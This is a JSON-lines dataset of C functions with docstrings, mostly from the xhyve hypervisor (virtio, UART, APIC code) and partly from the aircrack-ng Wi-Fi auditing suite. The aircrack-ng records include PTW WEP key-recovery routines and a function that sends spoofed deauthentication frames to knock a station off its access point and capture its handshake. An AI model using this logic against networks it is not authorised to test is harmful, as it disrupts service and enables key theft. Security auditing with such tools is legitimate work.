= vq->vq_vs;\n\told_idx = vq->vq_save_used;\n\tvq->vq_save_used = new_idx = vq->vq_used->vu_idx;\n\tif (used_all_avail &&\n\t    (vs->vs_negotiated_caps & VIRTIO_F_NOTIFY_ON_EMPTY))\n\t\tintr = 1;\n\telse if (vs->vs_negotiated_caps & VIRTIO_RING_F_EVENT_IDX) {\n\t\tevent_idx = VQ_USED_EVENT_IDX(vq);\n\t\t/*\n\t\t * This calculation is per docs and the kernel\n\t\t * (see src/sys/dev/virtio/virtio_ring.h).\n\t\t */\n\t\tintr = (uint16_t)(new_idx - event_idx - 1) <\n\t\t\t(uint16_t)(new_idx - old_idx);\n\t} else {\n\t\tintr = new_idx != old_idx &&\n\t\t    !(vq->vq_avail->va_flags & VRING_AVAIL_F_NO_INTERRUPT);\n\t}\n\tif (intr)\n\t\tvq_interrupt(vs, vq);\n}", "path": "xhyve/src/virtio.c", "commit_date": "2015-06-10 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "/*\n * The IIR returns a prioritized interrupt reason:\n * - receive data available\n * - transmit holding register empty\n * - modem status change\n *\n * Return an interrupt reason if one is available.\n */\n", "func_signal": "static int\nuart_intr_reason(struct uart_softc *sc)", "code": "{\n\n\tif ((sc->lsr & LSR_OE) != 0 && (sc->ier & IER_ERLS) != 0)\n\t\treturn (IIR_RLS);\n\telse if (rxfifo_numchars(sc) > 0 && (sc->ier & IER_ERXRDY) != 0)\n\t\treturn (IIR_RXTOUT);\n\telse if (sc->thre_int_pending && (sc->ier & IER_ETXRDY) != 0)\n\t\treturn (IIR_TXRDY);\n\telse if ((sc->msr & MSR_DELTA_MASK) != 0 && (sc->ier & IER_EMSC) != 0)\n\t\treturn (IIR_MLSC);\n\telse\n\t\treturn (IIR_NOPEND);\n}", "path": "xhyve/src/uart_emul.c", "commit_date": "2016-01-07 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "/*\n * This function populates 'dmask' with the set of vcpus that match the\n * addressing specified by the (dest, phys, lowprio) tuple.\n * \n * 'x2apic_dest' specifies whether 'dest' is interpreted as x2APIC (32-bit)\n * or xAPIC (8-bit) destination field.\n */\n", "func_signal": "static void\nvlapic_calcdest(struct vm *vm, cpuset_t *dmask, uint32_t dest, bool phys,\n    bool lowprio, bool x2apic_dest)", "code": "{\n\tstruct vlapic *vlapic;\n\tuint32_t dfr, ldr, ldest, cluster;\n\tuint32_t mda_flat_ldest, mda_cluster_ldest, mda_ldest, mda_cluster_id;\n\tcpuset_t amask;\n\tint vcpuid;\n\n\tif ((x2apic_dest && dest == 0xffffffff) ||\n\t    (!x2apic_dest && dest == 0xff)) {\n\t\t/*\n\t\t * Broadcast in both logical and physical modes.\n\t\t */\n\t\t*dmask = vm_active_cpus(vm);\n\t\treturn;\n\t}\n\n\tif (phys) {\n\t\t/*\n\t\t * Physical mode: destination is APIC ID.\n\t\t */\n\t\tCPU_ZERO(dmask);\n\t\tvcpuid = vm_apicid2vcpuid(vm, ((int) dest));\n\t\tif (vcpuid < VM_MAXCPU)\n\t\t\tCPU_SET(((unsigned) vcpuid), dmask);\n\t} else {\n\t\t/*\n\t\t * In the \"Flat Model\" the MDA is interpreted as an 8-bit wide\n\t\t * bitmask. This model is only avilable in the xAPIC mode.\n\t\t */\n\t\tmda_flat_ldest = dest & 0xff;\n\n\t\t/*\n\t\t * In the \"Cluster Model\" the MDA is used to identify a\n\t\t * specific cluster and a set of APICs in that cluster.\n\t\t */\n\t\tif (x2apic_dest) {\n\t\t\tmda_cluster_id = dest >> 16;\n\t\t\tmda_cluster_ldest = dest & 0xffff;\n\t\t} else {\n\t\t\tmda_cluster_id = (dest >> 4) & 0xf;\n\t\t\tmda_cluster_ldest = dest & 0xf;\n\t\t}\n\n\t\t/*\n\t\t * Logical mode: match each APIC that has a bit set\n\t\t * in it's LDR that matches a bit in the ldest.\n\t\t */\n\t\tCPU_ZERO(dmask);\n\t\tamask = vm_active_cpus(vm);\n\t\twhile ((vcpuid = CPU_FFS(&amask)) != 0) {\n\t\t\tvcpuid--;\n\t\t\tCPU_CLR(((unsigned) vcpuid), &amask);\n\n\t\t\tvlapic = vm_lapic(vm, vcpuid);\n\t\t\tdfr = vlapic->apic_page->dfr;\n\t\t\tldr = vlapic->apic_page->ldr;\n\n\t\t\tif ((dfr & APIC_DFR_MODEL_MASK) ==\n\t\t\t    APIC_DFR_MODEL_FLAT) {\n\t\t\t\tldest = ldr >> 24;\n\t\t\t\tmda_ldest = mda_flat_ldest;\n\t\t\t} else if ((dfr & APIC_DFR_MODEL_MASK) ==\n\t\t\t    APIC_DFR_MODEL_CLUSTER) {\n\t\t\t\tif (x2apic(vlapic)) {\n\t\t\t\t\tcluster = ldr >> 16;\n\t\t\t\t\tldest = ldr & 0xffff;\n\t\t\t\t} else {\n\t\t\t\t\tcluster = ldr >> 28;\n\t\t\t\t\tldest = (ldr >> 24) & 0xf;\n\t\t\t\t}\n\t\t\t\tif (cluster != mda_cluster_id)\n\t\t\t\t\tcontinue;\n\t\t\t\tmda_ldest = mda_cluster_ldest;\n\t\t\t} else {\n\t\t\t\t/*\n\t\t\t\t * Guest has configured a bad logical\n\t\t\t\t * model for this vcpu - skip it.\n\t\t\t\t */\n\t\t\t\tVLAPIC_CTR1(vlapic, \"vlapic has bad logical \"\n\t\t\t\t    \"model %x - cannot deliver interrupt\", dfr);\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tif ((mda_ldest & ldest) != 0) {\n\t\t\t\tCPU_SET(((unsigned) vcpuid), dmask);\n\t\t\t\tif (lowprio)\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n}", "path": "xhyve/src/vmm/io/vlapic.c", "commit_date": "2016-08-09 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "/*\n * Reset device (device-wide).  This erases all queues, i.e.,\n * all the queues become invalid (though we don't wipe out the\n * internal pointers, we just clear the VQ_ALLOC flag).\n *\n * It resets negotiated features to \"none\".\n *\n * If MSI-X is enabled, this also resets all the vectors to NO_VECTOR.\n */\n", "func_signal": "void\nvi_reset_dev(struct virtio_softc *vs)", "code": "{\n\tstruct vqueue_info *vq;\n\tint i, nvq;\n\n\tnvq = vs->vs_vc->vc_nvq;\n\tfor (vq = vs->vs_queues, i = 0; i < nvq; vq++, i++) {\n\t\tvq->vq_flags = 0;\n\t\tvq->vq_last_avail = 0;\n\t\tvq->vq_save_used = 0;\n\t\tvq->vq_pfn = 0;\n\t\tvq->vq_msix_idx = VIRTIO_MSI_NO_VECTOR;\n\t}\n\tvs->vs_negotiated_caps = 0;\n\tvs->vs_curq = 0;\n\t/* vs->vs_status = 0; -- redundant */\n\tif (vs->vs_isr)\n\t\tpci_lintr_deassert(vs->vs_pi);\n\tvs->vs_isr = 0;\n\tvs->vs_msix_cfg_idx = VIRTIO_MSI_NO_VECTOR;\n}", "path": "xhyve/src/virtio.c", "commit_date": "2015-06-10 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "/*\n * Helper inline for vq_getchain(): record the i'th \"real\"\n * descriptor.\n */\n", "func_signal": "static inline void\n_vq_record(int i, volatile struct virtio_desc *vd, struct iovec *iov, int n_iov,\n\tuint16_t *flags)", "code": "{\n\tif (i >= n_iov)\n\t\treturn;\n\tiov[i].iov_base = paddr_guest2host(vd->vd_addr, vd->vd_len);\n\tiov[i].iov_len = vd->vd_len;\n\tif (flags != NULL)\n\t\tflags[i] = vd->vd_flags;\n}", "path": "xhyve/src/virtio.c", "commit_date": "2015-06-10 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "/*\n * Return virtual C/H/S values for a given block. Use the algorithm\n * outlined in the VHD specification to calculate values.\n */\n", "func_signal": "void\nblockif_chs(struct blockif_ctxt *bc, uint16_t *c, uint8_t *h, uint8_t *s)", "code": "{\n\toff_t sectors;\t\t/* total sectors of the block dev */\n\toff_t hcyl;\t\t/* cylinders times heads */\n\tuint16_t secpt;\t\t/* sectors per track */\n\tuint8_t heads;\n\n\tassert(bc->bc_magic == ((int) BLOCKIF_SIG));\n\n\tsectors = bc->bc_size / bc->bc_sectsz;\n\n\t/* Clamp the size to the largest possible with CHS */\n\tif (sectors > 65535LL*16*255)\n\t\tsectors = 65535LL*16*255;\n\n\tif (sectors >= 65536LL*16*63) {\n\t\tsecpt = 255;\n\t\theads = 16;\n\t\thcyl = sectors / secpt;\n\t} else {\n\t\tsecpt = 17;\n\t\thcyl = sectors / secpt;\n\t\theads = (uint8_t) ((hcyl + 1023) / 1024);\n\n\t\tif (heads < 4)\n\t\t\theads = 4;\n\n\t\tif (hcyl >= (heads * 1024) || heads > 16) {\n\t\t\tsecpt = 31;\n\t\t\theads = 16;\n\t\t\thcyl = sectors / secpt;\n\t\t}\n\t\tif (hcyl >= (heads * 1024)) {\n\t\t\tsecpt = 63;\n\t\t\theads = 16;\n\t\t\thcyl = sectors / secpt;\n\t\t}\n\t}\n\n\t*c = (uint16_t) (hcyl / heads);\n\t*h = heads;\n\t*s = (uint8_t) secpt;\n}", "path": "xhyve/src/block_if.c", "commit_date": "2020-11-13 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "/*\n * Handle pci config space reads.\n * If it's to the MSI-X info, do that.\n * If it's part of the virtio standard stuff, do that.\n * Otherwise dispatch to the actual driver.\n */\n", "func_signal": "uint64_t\nvi_pci_read(UNUSED int vcpu, struct pci_devinst *pi, int baridx,\n\tuint64_t offset, int size)", "code": "{\n\tstruct virtio_softc *vs = pi->pi_arg;\n\tstruct virtio_consts *vc;\n\tstruct config_reg *cr;\n\tuint64_t virtio_config_size, max;\n\tconst char *name;\n\tuint32_t newoff;\n\tuint32_t value;\n\tint error;\n\n\tif (vs->vs_flags & VIRTIO_USE_MSIX) {\n\t\tif (baridx == pci_msix_table_bar(pi) ||\n\t\t    baridx == pci_msix_pba_bar(pi)) {\n\t\t\treturn (pci_emul_msix_tread(pi, offset, size));\n\t\t}\n\t}\n\n\t/* XXX probably should do something better than just assert() */\n\tassert(baridx == 0);\n\n\tif (vs->vs_mtx)\n\t\tpthread_mutex_lock(vs->vs_mtx);\n\n\tvc = vs->vs_vc;\n\tname = vc->vc_name;\n\tvalue = size == 1 ? 0xff : size == 2 ? 0xffff : 0xffffffff;\n\n\tif (size != 1 && size != 2 && size != 4)\n\t\tgoto bad;\n\n\tif (pci_msix_enabled(pi))\n\t\tvirtio_config_size = VTCFG_R_CFG1;\n\telse\n\t\tvirtio_config_size = VTCFG_R_CFG0;\n\n\tif (offset >= virtio_config_size) {\n\t\t/*\n\t\t * Subtract off the standard size (including MSI-X\n\t\t * registers if enabled) and dispatch to underlying driver.\n\t\t * If that fails, fall into general code.\n\t\t */\n\t\tnewoff = (uint32_t) (offset - virtio_config_size);\n\t\tmax = vc->vc_cfgsize ? vc->vc_cfgsize : 0x100000000;\n\t\tif ((newoff + ((unsigned) size)) > max)\n\t\t\tgoto bad;\n\t\terror = (*vc->vc_cfgread)(DEV_SOFTC(vs), ((int) newoff), size, &value);\n\t\tif (!error)\n\t\t\tgoto done;\n\t}\n\nbad:\n\tcr = vi_find_cr((int) offset);\n\tif (cr == NULL || cr->cr_size != size) {\n\t\tif (cr != NULL) {\n\t\t\t/* offset must be OK, so size must be bad */\n\t\t\tfprintf(stderr,\n\t\t\t    \"%s: read from %s: bad size %d\\r\\n\",\n\t\t\t    name, cr->cr_name, size);\n\t\t} else {\n\t\t\tfprintf(stderr,\n\t\t\t    \"%s: read from bad offset/size %jd/%d\\r\\n\",\n\t\t\t    name, (uintmax_t)offset, size);\n\t\t}\n\t\tgoto done;\n\t}\n\n\tswitch (offset) {\n\tcase VTCFG_R_HOSTCAP:\n\t\tvalue = (uint32_t) vc->vc_hv_caps;\n\t\tbreak;\n\tcase VTCFG_R_GUESTCAP:\n\t\tvalue = vs->vs_negotiated_caps;\n\t\tbreak;\n\tcase VTCFG_R_PFN:\n\t\tif (vs->vs_curq < vc->vc_nvq)\n\t\t\tvalue = vs->vs_queues[vs->vs_curq].vq_pfn;\n\t\tbreak;\n\tcase VTCFG_R_QNUM:\n\t\tvalue = vs->vs_curq < vc->vc_nvq ?\n\t\t    vs->vs_queues[vs->vs_curq].vq_qsize : 0;\n\t\tbreak;\n\tcase VTCFG_R_QSEL:\n\t\tvalue = (uint32_t) (vs->vs_curq);\n\t\tbreak;\n\tcase VTCFG_R_QNOTIFY:\n\t\tvalue = 0;\t/* XXX */\n\t\tbreak;\n\tcase VTCFG_R_STATUS:\n\t\tvalue = vs->vs_status;\n\t\tbreak;\n\tcase VTCFG_R_ISR:\n\t\tvalue = vs->vs_isr;\n\t\tvs->vs_isr = 0;\t\t/* a read clears this flag */\n\t\tif (value)\n\t\t\tpci_lintr_deassert(pi);\n\t\tbreak;\n\tcase VTCFG_R_CFGVEC:\n\t\tvalue = vs->vs_msix_cfg_idx;\n\t\tbreak;\n\tcase VTCFG_R_QVEC:\n\t\tvalue = vs->vs_curq < vc->vc_nvq ?\n\t\t    vs->vs_queues[vs->vs_curq].vq_msix_idx :\n\t\t    VIRTIO_MSI_NO_VECTOR;\n\t\tbreak;\n\t}\ndone:\n\tif (vs->vs_mtx)\n\t\tpthread_mutex_unlock(vs->vs_mtx);\n\treturn (value);\n}", "path": "xhyve/src/virtio.c", "commit_date": "2015-06-10 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "/*\n * Return specified request chain to the guest, setting its I/O length\n * to the provided value.\n *\n * (This chain is the one you handled when you called vq_getchain()\n * and used its positive return value.)\n */\n", "func_signal": "void\nvq_relchain(struct vqueue_info *vq, uint16_t idx, uint32_t iolen)", "code": "{\n\tuint16_t uidx, mask;\n\tvolatile struct vring_used *vuh;\n\tvolatile struct virtio_used *vue;\n\n\t/*\n\t * Notes:\n\t *  - mask is N-1 where N is a power of 2 so computes x % N\n\t *  - vuh points to the \"used\" data shared with guest\n\t *  - vue points to the \"used\" ring entry we want to update\n\t *  - head is the same value we compute in vq_iovecs().\n\t *\n\t * (I apologize for the two fields named vu_idx; the\n\t * virtio spec calls the one that vue points to, \"id\"...)\n\t */\n\tmask = vq->vq_qsize - 1;\n\tvuh = vq->vq_used;\n\n\tuidx = vuh->vu_idx;\n\tvue = &vuh->vu_ring[uidx++ & mask];\n\tvue->vu_idx = idx;\n\tvue->vu_tlen = iolen;\n\tvuh->vu_idx = uidx;\n}", "path": "xhyve/src/virtio.c", "commit_date": "2015-06-10 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "/*\n * Guest virtual machine i/o callbacks\n */\n", "func_signal": "static int\ncb_copyin(UNUSED void *arg, const void *from, uint64_t to, size_t size)", "code": "{\n\tchar *ptr;\n\n\tto &= 0x7fffffff;\n\n\tptr = xh_vm_map_gpa(to, size);\n\tif (ptr == NULL)\n\t\treturn (EFAULT);\n\n\tmemcpy(ptr, from, size);\n\treturn (0);\n}", "path": "xhyve/src/firmware/fbsd.c", "commit_date": "2019-09-17 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "/*\n * Toggle the COM port's intr pin depending on whether or not we have an\n * interrupt condition to report to the processor.\n */\n", "func_signal": "static void\nuart_toggle_intr(struct uart_softc *sc)", "code": "{\n\tuint8_t intr_reason;\n\n\tintr_reason = (uint8_t) uart_intr_reason(sc);\n\n\tif (intr_reason == IIR_NOPEND)\n\t\t(*sc->intr_deassert)(sc->arg);\n\telse\n\t\t(*sc->intr_assert)(sc->arg);\n}", "path": "xhyve/src/uart_emul.c", "commit_date": "2016-01-07 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "/*\n * Link a virtio_softc to its constants, the device softc, and\n * the PCI emulation.\n */\n", "func_signal": "void\nvi_softc_linkup(struct virtio_softc *vs, struct virtio_consts *vc,\n\t\tvoid *dev_softc, struct pci_devinst *pi,\n\t\tstruct vqueue_info *queues)", "code": "{\n\tint i;\n\n\t/* vs and dev_softc addresses must match */\n\tassert((void *)vs == dev_softc);\n\tvs->vs_vc = vc;\n\tvs->vs_pi = pi;\n\tpi->pi_arg = vs;\n\n\tvs->vs_queues = queues;\n\tfor (i = 0; i < vc->vc_nvq; i++) {\n\t\tqueues[i].vq_vs = vs;\n\t\tqueues[i].vq_num = (uint16_t) i;\n\t}\n}", "path": "xhyve/src/virtio.c", "commit_date": "2015-06-10 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "/*\n * Set I/O BAR (usually 0) to map PCI config registers.\n */\n", "func_signal": "void\nvi_set_io_bar(struct virtio_softc *vs, int barnum)", "code": "{\n\tsize_t size;\n\n\t/*\n\t * ??? should we use CFG0 if MSI-X is disabled?\n\t * Existing code did not...\n\t */\n\tsize = VTCFG_R_CFG1 + vs->vs_vc->vc_cfgsize;\n\tpci_emul_alloc_bar(vs->vs_pi, barnum, PCIBAR_IO, size);\n}", "path": "xhyve/src/virtio.c", "commit_date": "2015-06-10 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "// RC4 key stream generation\n", "func_signal": "static uint8_t rc4update(rc4state * state)", "code": "{\n\tREQUIRE(state != NULL);\n\n\tuint8_t tmp;\n\tuint8_t k;\n\tstate->i++;\n\tstate->j += state->s[state->i];\n\ttmp = state->s[state->i];\n\tstate->s[state->i] = state->s[state->j];\n\tstate->s[state->j] = tmp;\n\tk = state->s[state->i] + state->s[state->j];\n\n\treturn state->s[k];\n}", "path": "aircrack-ng/lib/ptw/aircrack-ptw-lib.c", "commit_date": "2020-07-23 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
{"docstring": "// For sorting\n", "func_signal": "static int comparedoublesorthelper(const void * ina, const void * inb)", "code": "{\n\tREQUIRE(ina != NULL);\n\tREQUIRE(inb != NULL);\n\n\tdoublesorthelper * a = (doublesorthelper *) ina;\n\tdoublesorthelper * b = (doublesorthelper *) inb;\n\tif (a->difference > b->difference)\n\t{\n\t\treturn 1;\n\t}\n\telse if (fabs(a->difference - b->difference) < FLT_EPSILON)\n\t{\n\t\treturn 0;\n\t}\n\telse\n\t{\n\t\treturn -1;\n\t}\n}", "path": "aircrack-ng/lib/ptw/aircrack-ptw-lib.c", "commit_date": "2020-07-23 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
{"docstring": "/*\n * Print the time and percentage in readable format\n */\n", "func_signal": "void calctime(time_t t, float perc)", "code": "{\n\tint days = 0, hours = 0, mins = 0, secs = 0, remain = 0, printed = 0;\n\tchar buf[8];\n\n\tdays = t / 86400;\n\tremain = t % 86400;\n\n\thours = remain / 3600;\n\tremain = remain % 3600;\n\n\tmins = remain / 60;\n\tsecs = remain % 60;\n\n\tif (days) printed += printf(\"%d day%s, \", days, (days > 1 ? \"s\" : \"\"));\n\n\tif (hours) printed += printf(\"%d hour%s, \", hours, (hours > 1 ? \"s\" : \"\"));\n\n\tif (mins) printed += printf(\"%d minute%s, \", mins, (mins > 1 ? \"s\" : \"\"));\n\n\tsnprintf(buf, sizeof(buf), \"%3.2f%%\", perc);\n\n\tprinted += printf(\"%d second%s\", secs, (secs != 1 ? \"s\" : \"\"));\n\n\tprintf(\"%*s %s\\n\", (int) (47 - (printed + strlen(buf) % 5)), \" \", buf);\n}", "path": "aircrack-ng/lib/libac/support/common.c", "commit_date": "2020-11-01 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
{"docstring": "// Return the number of cpu. If detection fails, it will return -1;\n", "func_signal": "int get_nb_cpus(void)", "code": "{\n\tint number = -1;\n\n#if defined(_WIN32) || defined(_WIN64)\n\tSYSTEM_INFO sysinfo = {0};\n\n\tGetSystemInfo(&sysinfo);\n\n\tnumber = sysinfo.dwNumberOfProcessors;\n#elif defined(__linux__)\n\tchar *s, *pos;\n\tFILE * f;\n\t// Reading /proc/cpuinfo is more reliable on current CPUs,\n\t// so put it first and try the old method if this one fails\n\tf = fopen(\"/proc/cpuinfo\", \"r\");\n\n\tif (f != NULL)\n\t{\n\t\ts = (char *) calloc(1, 81);\n\n\t\tif (s != NULL)\n\t\t{\n\t\t\t// Get the latest value of \"processor\" element\n\t\t\t// and increment it by 1 and it that value\n\t\t\t// will be the number of CPU.\n\t\t\tnumber = -2;\n\n\t\t\twhile (fgets(s, 80, f) != NULL)\n\t\t\t{\n\t\t\t\tpos = strstr(s, \"processor\");\n\n\t\t\t\tif (pos == s)\n\t\t\t\t{\n\t\t\t\t\tpos = strchr(s, ':');\n\n\t\t\t\t\tif (pos != NULL)\n\t\t\t\t\t{\n\t\t\t\t\t\tint tmp_number = atoi(pos + 1);\n\t\t\t\t\t\tif (tmp_number > 0 && tmp_number <= 1024)\n\t\t\t\t\t\t\tnumber = tmp_number;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t++number;\n\t\t\tfree(s);\n\t\t}\n\n\t\tfclose(f);\n\t}\n#elif defined(__FreeBSD__) || defined(__OpenBSD__) || defined(__DragonFly__)   \\\n\t|| defined(__MidnightBSD__)\n\t// Not sure about defined(__DragonFly__) || defined(__NetBSD__) ||\n\t// defined(__OpenBSD__) || defined(__APPLE__)\n\tint mib[] = {CTL_HW, HW_NCPU};\n\tsize_t len;\n\tunsigned long nbcpu;\n\n\tlen = sizeof(nbcpu);\n\n\tif (!sysctl(mib, 2, &nbcpu, &len, NULL, 0))\n\t{\n\t\tnumber = (int) nbcpu;\n\t}\n#endif\n\n#ifdef _SC_NPROCESSORS_ONLN\n\t// Try the usual method if _SC_NPROCESSORS_ONLN exist\n\tif (number == -1)\n\t{\n\t\tnumber = sysconf(_SC_NPROCESSORS_ONLN);\n\t\t/* Fails on some archs */\n\t\tif (number < 1)\n\t\t{\n\t\t\tnumber = -1;\n\t\t}\n\t}\n#endif\n\n\treturn number;\n}", "path": "aircrack-ng/lib/libac/support/common.c", "commit_date": "2020-11-01 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
{"docstring": "/*\n * Add a new session to the attack\n * state - state of attack\n * iv - IV used in the session\n * keystream - recovered keystream from the session\n */\n", "func_signal": "int PTW_addsession(PTW_attackstate * state,\n\t\t\t\t   uint8_t * iv,\n\t\t\t\t   uint8_t * keystream,\n\t\t\t\t   int * weight,\n\t\t\t\t   int total)", "code": "{\n\tREQUIRE(state != NULL);\n\tREQUIRE(iv != NULL);\n\tREQUIRE(keystream != NULL);\n\tREQUIRE(weight != NULL);\n\n\tint i, j;\n\tint il;\n\tint ir;\n\tuint8_t buf[PTW_KEYHSBYTES];\n\n\ti = (iv[0] << 16) | (iv[1] << 8) | (iv[2]);\n\til = i / 8;\n\tir = 1 << (i % 8);\n\tif ((state->seen_iv[il] & ir) == 0)\n\t{\n\t\tstate->seen_iv[il] |= ir;\n\t\tfor (j = 0; j < total; j++)\n\t\t{\n\t\t\tstate->packets_collected++;\n\t\t\tguesskeybytes(\n\t\t\t\tIVBYTES, iv, &keystream[KSBYTES * j], buf, PTW_KEYHSBYTES);\n\t\t\tfor (i = 0; i < KEYHSBYTES; i++)\n\t\t\t{\n\t\t\t\tstate->table[i][buf[i]].votes += weight[j];\n\t\t\t}\n\t\t\tif (state->allsessions_size < state->packets_collected)\n\t\t\t{\n\t\t\t\tstate->allsessions_size = state->allsessions_size << 1;\n\t\t\t\tPTW_session * tmp_allsessions\n\t\t\t\t\t= realloc(state->allsessions,\n\t\t\t\t\t\t\t  state->allsessions_size * sizeof(PTW_session));\n\t\t\t\tALLEGE(tmp_allsessions != NULL);\n\t\t\t\tstate->allsessions = tmp_allsessions;\n\t\t\t}\n\t\t\tmemcpy(state->allsessions[state->packets_collected - 1].iv,\n\t\t\t\t   iv,\n\t\t\t\t   IVBYTES);\n\t\t\tmemcpy(state->allsessions[state->packets_collected - 1].keystream,\n\t\t\t\t   &keystream[KSBYTES * j],\n\t\t\t\t   KSBYTES);\n\t\t\tstate->allsessions[state->packets_collected - 1].weight = weight[j];\n\t\t}\n\t\tif ((state->sessions_collected < CONTROLSESSIONS))\n\t\t{\n\t\t\tmemcpy(state->sessions[state->sessions_collected].iv, iv, IVBYTES);\n\t\t\tmemcpy(state->sessions[state->sessions_collected].keystream,\n\t\t\t\t   keystream,\n\t\t\t\t   KSBYTES);\n\t\t\tstate->sessions_collected++;\n\t\t}\n\n\t\treturn (FAILURE);\n\t}\n\telse\n\t{\n\t\treturn (SUCCESS);\n\t}\n}", "path": "aircrack-ng/lib/ptw/aircrack-ptw-lib.c", "commit_date": "2020-07-23 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
{"docstring": "// airodump-ng.c\n", "func_signal": "static char * format_text_for_csv(const unsigned char * input, size_t len)", "code": "{\n\t// Unix style encoding\n\tchar *ret, *rret;\n\tsize_t i, pos;\n\tint contains_space_end;\n\tconst char * hex_table = \"0123456789ABCDEF\";\n\n\tif (len == 0 || input == NULL)\n\t{\n\t\tret = (char *) malloc(1);\n\t\tALLEGE(ret != NULL);\n\t\tret[0] = 0;\n\t\treturn (ret);\n\t}\n\n\tpos = 0;\n\tcontains_space_end = (input[0] == ' ') || input[len - 1] == ' ';\n\n\t// Make sure to have enough memory for all that stuff\n\tret = (char *) malloc((len * 4) + 1 + 2);\n\tALLEGE(ret != NULL);\n\n\tif (contains_space_end)\n\t{\n\t\tret[pos++] = '\"';\n\t}\n\n\tfor (i = 0; i < len; i++)\n\t{\n\t\tif (!isprint(input[i]) || input[i] == ',' || input[i] == '\\\\'\n\t\t\t|| input[i] == '\"')\n\t\t{\n\t\t\tret[pos++] = '\\\\';\n\t\t}\n\n\t\tif (isprint(input[i]))\n\t\t{\n\t\t\tret[pos++] = input[i];\n\t\t}\n\t\telse if (input[i] == '\\n' || input[i] == '\\r' || input[i] == '\\t')\n\t\t{\n\t\t\tret[pos++]\n\t\t\t\t= (char) ((input[i] == '\\n') ? 'n' : (input[i] == '\\t') ? 't'\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t: 'r');\n\t\t}\n\t\telse\n\t\t{\n\t\t\tret[pos++] = 'x';\n\t\t\tret[pos++] = hex_table[input[i] / 16];\n\t\t\tret[pos++] = hex_table[input[i] % 16];\n\t\t}\n\t}\n\n\tif (contains_space_end)\n\t{\n\t\tret[pos++] = '\"';\n\t}\n\n\tret[pos++] = '\\0';\n\n\trret = realloc(ret, pos);\n\n\treturn (rret) ? (rret) : (ret);\n}", "path": "aircrack-ng/src/airodump-ng/dump_write.c", "commit_date": "2020-10-31 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
{"docstring": "// TODO: this function is hacked together, It should be cleaned up\n// Need to use wfrm (ieee80211_frame struct instead of just a buffer)\n", "func_signal": "static int deauth_station(struct WPA_ST_info * st_cur)", "code": "{\n\tREQUIRE(st_cur != NULL);\n\n\tif (memcmp(st_cur->stmac, NULL_MAC, 6) != 0)\n\t{\n\t\t/* deauthenticate the target */\n\n\t\tmemcpy(h80211, DEAUTH_REQ, 26);\n\t\tmemcpy(h80211 + 16, st_cur->bssid, 6);\n\n\t\tint i;\n\t\tfor (i = 0; i < 5; i++)\n\t\t{\n\t\t\tPCT;\n\t\t\tprintf(\"Sending 5 directed DeAuth. STMAC:\"\n\t\t\t\t   \" [%02X:%02X:%02X:%02X:%02X:%02X] \\r\",\n\t\t\t\t   st_cur->stmac[0],\n\t\t\t\t   st_cur->stmac[1],\n\t\t\t\t   st_cur->stmac[2],\n\t\t\t\t   st_cur->stmac[3],\n\t\t\t\t   st_cur->stmac[4],\n\t\t\t\t   st_cur->stmac[5]);\n\n\t\t\tmemcpy(h80211 + 4, st_cur->stmac, 6);\n\t\t\tmemcpy(h80211 + 10, st_cur->bssid, 6);\n\n\t\t\tif (send_packet(_wi_out, h80211, 26, kRewriteSequenceNumber) < 0)\n\t\t\t\treturn (1);\n\n\t\t\t// Send deauth to the AP...\n\t\t\tmemcpy(h80211 + 4, st_cur->bssid, 6);\n\t\t\tmemcpy(h80211 + 10, st_cur->stmac, 6);\n\n\t\t\tif (send_packet(_wi_out, h80211, 26, kRewriteSequenceNumber) < 0)\n\t\t\t\treturn (1);\n\t\t\t// Usually this is where we would wait for an ACK, but we need to\n\t\t\t// get back\n\t\t\t// to capturing packets to get the EAPOL 4 way handshake\n\t\t}\n\n\t\treturn (0);\n\t}\n\n\treturn (0);\n}", "path": "aircrack-ng/src/airventriloquist-ng/airventriloquist-ng.c", "commit_date": "2020-10-31 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
